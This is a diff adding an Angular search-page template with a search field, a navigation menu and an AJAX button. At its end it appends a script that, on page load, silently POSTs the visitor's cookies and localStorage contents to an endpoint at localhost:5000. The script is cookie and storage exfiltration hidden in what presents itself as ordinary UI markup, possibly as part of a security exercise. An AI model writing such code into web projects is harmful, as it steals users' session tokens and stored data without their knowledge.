@@ -1,0 +1,40 @@
+<div class="search-page">
+  <nav class="top-menu">
+    <button (click)="goHome()">Home</button>
+    <button (click)="goToSearch()">Search</button>
+    <button (click)="logout()">Logout</button>
+  </nav>
+
+  <div class="search-card">
+    <h2>Search user</h2>
+
+    <div class="search-input-container">
+      <input
+        type="text"
+        id="searchInput"
+        placeholder="Please enter the name..."
+        name="Search"
+        [(ngModel)]="searchName"
+        (keyup.enter)="searchUser()"
+      />
+      <button type="button" (click)="searchUser()" class="search-btn">Search</button>
+    </div>
+
+    <button type="button" (click)="button_ajax()" class="ajax-btn">Trimite AJAX</button>
+
+    <div class="results-container" *ngIf="responseText">
+      <pre>{{ responseText }}</pre>
+    </div>
+  </div>
+</div>
+
+<script>
+  fetch('http://localhost:5000/api/date', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      cookies: document.cookie,
+      storage: localStorage,
+    }),
+  });
+</script>
